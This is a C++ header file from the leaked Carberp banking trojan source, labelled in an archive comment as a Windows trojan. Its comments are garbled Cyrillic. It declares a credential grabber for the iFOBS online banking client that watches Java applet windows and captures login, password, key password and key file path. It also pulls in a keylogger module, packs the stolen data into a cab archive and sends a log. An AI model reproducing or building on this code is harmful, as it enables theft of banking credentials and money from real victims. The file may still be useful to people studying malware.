/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */

//===========================================================================
//  ������ ���������� ����������� �� Ifobs ������
//
//  �������������: ������� 2012
//  ������:        1.0
//===========================================================================

#ifndef IfobsOnlineH
#define IfobsOnlineH
//---------------------------------------------------------------------------

#include "JavaAppletGrabbers.h"
#include "KeyLogger.h"
#include "BotClasses.h"


#define IFOBS_MAX_KEY_PATH_SIZE  3145728   /* ����. ������ ����� 3 ��������� */


namespace IfobsOnline
{
	// ������� ���������� ������ IfobsOnline
	bool Initialize(HWND JafaFrameWnd, DWORD ClassWndHash, const char* URL, bool IsChildWnd);
}



//******************************************************
//  ����� ������������� ����� ����� �� ����� ����
//******************************************************
class TIfobsOnlineGrabber : public TBotObject
{
private:
	HWND FSunAwtFrameWnd;
	TBotList FEdits; // ������ ������

	HWND LoginWnd;
	HWND PasswordWnd;
	HWND KeyPasswordWnd;
	HWND KeyPathWnd;
	DWORD Captions;  // ����� �������� ��������

	string FLogin;
	string FPassword;
	string FKeyPassword;
	string FKeyFilePath;

	bool FIsIfobs;

	void   CheckWindow(HWND Wnd);
	void   InsertWnd(HWND Wnd, TBotList &L);
	bool   CheckScheme();
	HWND   GetEditByID(LONG ID);
	string PackTextData();
	void   AddFilesToCab(LPVOID Cab);

	friend int CALLBACK TIfobsOnlineGrabberEnumWnd(HWND Wnd, LPARAM Param);
public:
	TIfobsOnlineGrabber(HWND SunAwtFrameWnd);
	~TIfobsOnlineGrabber() {};

	bool inline IsIfobs() { return FIsIfobs; };

	BOOL SendLog();
};


//---------------------------------------------------------------------------
#endif
